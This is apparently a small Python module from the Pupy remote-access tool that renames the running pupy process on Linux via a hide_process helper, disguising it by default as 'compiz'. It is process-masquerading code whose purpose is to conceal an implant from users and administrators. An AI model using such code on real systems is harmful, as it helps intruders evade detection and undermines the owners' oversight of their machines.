# -*- coding: utf-8 -*-

""" change pupy process's name """

dependencies = {
    'linux': ['hide_process']
}

arguments = {
    'name': 'ex: compiz'
}


import sys

def main(name='compiz'):
    print "HIDE ARGV!!!"
    print "NAME:", name
    if sys.platform == 'linux2':
        import hide_process
        hide_process.change_argv(argv=name)
